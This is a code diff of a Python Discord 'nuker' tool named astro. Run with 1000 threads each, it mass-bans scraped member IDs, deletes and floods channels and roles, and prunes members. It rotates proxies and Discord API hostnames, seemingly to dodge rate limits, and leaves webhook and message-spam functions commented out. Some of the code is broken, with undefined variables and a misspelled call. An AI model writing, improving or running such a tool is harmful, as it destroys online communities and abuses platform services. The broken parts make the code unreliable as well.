@@ -3,7 +3,6 @@ import sys
 import time
 import json
 import httpx
-import queue
 import random
 import discord
 import threading
@@ -36,10 +35,10 @@ class astro:
 
                                                                   choices:
                                      ╔═════════════════════════════════════════════════════════════════╗
-	                             ║ [1] - massban ids                         [2] - massban scraped ║
-        	                     ║ [3] - delete channels                     [4] - create channels ║
-                	             ║ [5] - delete roles                        [6] - create roles    ║
-                        	     ║ [7] - prune members                       [8] - soon...         ║
+                                     ║ [1] - massban ids                         [2] - massban scraped ║
+                                     ║ [3] - delete channels                     [4] - create channels ║
+                                     ║ [5] - delete roles                        [6] - create roles    ║
+                                     ║ [7] - prune members                       [8] - soon...         ║
                                      ╚═════════════════════════════════════════════════════════════════╝
 > astro.cybin.cc
 > made by horrid
@@ -175,20 +174,40 @@ class astro:
     spamparam = {"content": random.choice(whookcontents)}
     whookparam = {"name": random.choice(whookusers)}
 
-    def massbansend():
+    def massbanidsend():
         try:
             while True:
-                req, url, headers = astro.q.get()
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers)
-                print(s.status_code)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
-                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
-                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
-                astro.q.task_done()
+                for member in open("scraped/ids.txt"):
+                    ranidapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
+                    s = req(url, headers=headers)
+                    print(s.status_code)
+                    astro.count += 1
+                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
+                    if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
+                        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
+        except Exception as err:
+            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+            else:
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
+
+    def massbansend():
+        try:
+            while True:
+                p = open("proxies.txt", "r")
+                pr = p.readlines()
+                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+                for member in open("scraped/scraped.txt"):
+                    ranidapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
+                    s = httpx.put(random.choice(ranidapi), headers=headers, proxies=proxy)
+                    print(s.status_code)
+                    astro.count += 1
+                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
+                    if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
+                        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
         except Exception as err:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
@@ -202,10 +221,11 @@ class astro:
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel deleted - status code: {s.status_code} - time: {time.ctime()}", 1))
-                astro.q.task_done()
+                for channel in open("scraped/channels.txt"):
+                    ranchanapi = [f"https://discord.com/api/v9/channels/{channel}", f"https://discordapp.com/api/v9/channels/{channel}", f"https://canary.discord.com/api/v9/channels/{channel}", f"https://ptb.discord.com/api/v9/channels/{channel}"]
+                    s = httpx.delete(random.choice(ranchanapi), headers=headers, proxies=proxy)
+                    astro.count += 1
+                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel deleted - status code: {s.status_code} - time: {time.ctime()}", 1))
         except Exception as err:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
@@ -219,10 +239,10 @@ class astro:
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers, json=astro.jsonparam)
+                ranchancrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/channels/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/channels"]
+                s = httpx.post(random.choice(ranchancrapi), headers=headers, json=astro.jsonparam, proxies=proxy)
                 astro.count += 1
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel created - status code: {s.status_code} - time: {time.ctime()}", 1))
-                astro.q.task_done()
         except Exception as err:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
@@ -233,14 +253,13 @@ class astro:
     def rolecrereqsend():
         try:
             while True:
-                req, url, headers = astro.q.get()
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers, json=astro.jsonparamrole)
+                ranrolecrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles"]
+                s = httpx.put(random.choice(ranrolecrapi), headers=headers, json=astro.jsonparamrole, proxies=proxy)
                 astro.count += 1
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} role created - status code: {s.status_code} - time: {time.ctime()}", 1))
-                astro.q.task_done()
         except Exception as err:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
@@ -248,45 +267,23 @@ class astro:
                 print(err)
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
-    def whookmakesend():
-        try:
-            while True:
-                req, url, headers = astro.q.get()
-                p = open("proxies.txt", "r")
-                pr = p.readlines()
-                proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers, json=astro.whookparam)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} webhook made - status code: {s.status_code} - time: {time.ctime()}", 1))
-                astro.q.task_done()
-        except Exception as err:
-            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
-            else:
-                print(err)
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
-
-
-    def chandelsend():
-        try:
-            while True:
-                req, url, headers = astro.q.get()
-                p = open("proxies.txt", "r")
-                pr = p.readlines()
-                proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} deleted channels - status code: {s.status_code} - time: {time.ctime()}", 1))
-                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
-                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
-                    for i in range(50):
-                        input()
-                astro.q.task_done()
-        except Exception as err:
-            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
-            else:
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
+# Coming soon....
+#    def whookmakesend():
+#        try:
+#            while True:
+#                req, url, headers = astro.q.get()
+#                p = open("proxies.txt", "r")
+#                pr = p.readlines()
+#                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+#                s = req(url, headers=headers, json=astro.whookparam)
+#                astro.count += 1
+#                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} webhook made - status code: {s.status_code} - time: {time.ctime()}", 1))
+#        except Exception as err:
+#            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+#                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+#            else:
+#                print(err)
+#                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
     def roledelsend():
         try:
@@ -295,14 +292,15 @@ class astro:
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} deleted roles - status code: {s.status_code} - time: {time.ctime()}", 1))
+                for role in open("scraped/roles.txt"):
+                    ranroledelapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles/{role}",f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles/{role}", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles/{role}", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles/{role}"]
+                    s = httpx.delete(random.chouce(ranroledelapi), headers=headers, proxies=proxy)
+                    astro.count += 1
+                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} deleted roles - status code: {s.status_code} - time: {time.ctime()}", 1))
                 if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                     print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                     for i in range(50):
                         input()
-                astro.q.task_done()
         except Exception as err:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
@@ -316,10 +314,11 @@ class astro:
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers, json=astro.pruneparam)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - pruned members - status code: {s.status_code} - time: {time.ctime()}", 1))
-                astro.q.task_done()
+                for i in range(10):
+                    url = f"https://discord.com/v9/guilds/{astro.guild}/prune/"
+                    s = httpx.post(url, headers=headers, json=astro.pruneparam, proxies=proxy)
+                    astro.count += 1
+                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - pruned members - status code: {s.status_code} - time: {time.ctime()}", 1))
         except Exception as err:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
@@ -327,73 +326,34 @@ class astro:
                 print(err)
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
-    def spamreqsend():
-        try:
-            while True:
-                req, url, headers = astro.q.get()
-                p = open("proxies.txt", "r")
-                pr = p.readlines()
-                proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers, json=spamparam)
-                astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} messages sent - status code: {s.status_code} - time: {time.ctime()}", 1))
-                astro.q.task_done()
-        except Exception as err:
-            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
-            else:
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
+# Coming soon...
+#    def spamreqsend():
+#        try:
+#            while True:
+#                req, url, headers = astro.q.get()
+#                p = open("proxies.txt", "r")
+#                pr = p.readlines()
+#                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+#                s = req(url, headers=headers, json=spamparam)
+#                astro.count += 1
+#                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} messages sent - status code: {s.status_code} - time: {time.ctime()}", 1))
+#                astro.q.task_done()
+#        except Exception as err:
+#            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+#                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+#            else:
+#                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
-    def idworker():
-        for member in open("scraped/ids.txt"):
-            ranidapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}"]
-            astro.q.put((httpx.put, random.choice(ranidapi), astro.headers))
-        astro.q.join()
+#    def makewhooks():
+#        for channel in open("scraped/channels.txt"):
+#            whookapi = f"https://discord.com/api/v9/channels/{channel}/webhooks"
+#            astro.q.put((httpx.post, whookapi, astro.headers))
 
-    def massbanworker():
-        for member in open("scraped/scraped.txt"):
-            ranapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
-            astro.q.put((httpx.put, random.choice(ranapi), astro.headers))
-            amount += 1
-            os.system(f"title Astrov5 - Bans: {amount}")
-        astro.q.join()
-
-    def channeldelworker():
-        for channel in open("scraped/channels.txt"):
-            ranchanapi = [f"https://discord.com/api/v9/channels/{channel}", f"https://discordapp.com/api/v9/channels/{channel}", f"https://canary.discord.com/api/v9/channels/{channel}", f"https://ptb.discord.com/api/v9/channels/{channel}"]
-            astro.q.put((httpx.delete, random.choice(ranchanapi), astro.headers))
-
-    def channelmakeworker():
-        for i in range(1000):
-            ranchancrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/channels/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/channels"]
-            astro.q.put((httpx.post, random.choice(ranchancrapi), astro.headers))
-
-    def roledelworker():
-        for role in open("scraped/roles.txt"):
-            for i in range(1000):
-                ranroledelapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles/{role}",f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles/{role}", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles/{role}", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles/{role}"]
-                astro.q.put((httpx.delete, random.choice(ranroledelapi), astro.headers))
-
-    def rolemakeworker():
-        for i in range(1000):
-            ranrolecrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles"]
-            astro.q.put((httpx.post, random.choice(ranrolecrapi), astro.headers))
-
-    def pruneworker():
-        for i in range(10):
-            url = f"https://discord.com/v9/guilds/{astro.guild}/prune/"
-            astro.q.put((httpx.post, url, astro.headers))
-
-    def makewhooks():
-        for channel in open("scraped/channels.txt"):
-            whookapi = f"https://discord.com/api/v9/channels/{channel}/webhooks"
-            astro.q.put((httpx.post, whookapi, astro.headers))
-
-    def spamworker():
-        for channel in open("scraped/channels.txt"):
-            for i in range(1000):
-                ranspamapi = [f"https://discord.com/api/v9/channels/{channel}/messages", f"https://discordapp.com/api/api/v9/channels/{channel}/messages", f"https://canary.discord.com/api/v9/channels/{channel}/messages", f"https://ptb.discord.com/api/v9/channels/{channel}/messages"]
-                astro.q.put((httpx.post, random.choice(ranspamapi), astro.headers))
+#    def spamworker():
+#        for channel in open("scraped/channels.txt"):
+#            for i in range(1000):
+#                ranspamapi = [f"https://discord.com/api/v9/channels/{channel}/messages", f"https://discordapp.com/api/api/v9/channels/{channel}/messages", f"https://canary.discord.com/api/v9/channels/{channel}/messages", f"https://ptb.discord.com/api/v9/channels/{channel}/messages"]
+#                astro.q.put((httpx.post, random.choice(ranspamapi), astro.headers))
 
     @client.event
     async def on_connect():
@@ -437,9 +397,8 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.idworker()
             for x in range(1000):
-                threading.Thread(target=astro.massbansend, daemon=True).start()
+                threading.Thread(target=astro.massbanidsend, daemon=True).start()
 
         if option == "2":
             if os.name == "nt":
@@ -448,7 +407,6 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.massbanworker()
             for x in range(1000):
                 threading.Thread(target=astro.massbansend, daemon=True).start()
 
@@ -459,7 +417,6 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.channeldelworker()
             for x in range(1000):
                 threading.Thread(target=astro.chandelreqsend, daemon=True).start()
 
@@ -470,7 +427,6 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.channelmakeworker()
             for x in range(1000):
                 threading.Thread(target=astro.chancrereqsend, daemon=True).start()
 
@@ -481,7 +437,6 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.roledelworker()
             for x in range(1000):
                 threading.Thread(target=astro.roledelsend, daemon=True).start()
 
@@ -492,7 +447,6 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.rolemakeworker()
             for x in range(1000):
                 threading.Thread(target=astro.rolecrereqsend, daemon=True).start()
 
@@ -503,7 +457,6 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.pruneworker()
             for x in range(1):
                 threading.Thread(target=astro.prunereqsend, daemon=True).start()
 
@@ -514,7 +467,6 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
-            astro.makewhooks()
             for x in range(1000):
                 threading.Thread(target=astro.whookmakesend, daemon=True).start()
 
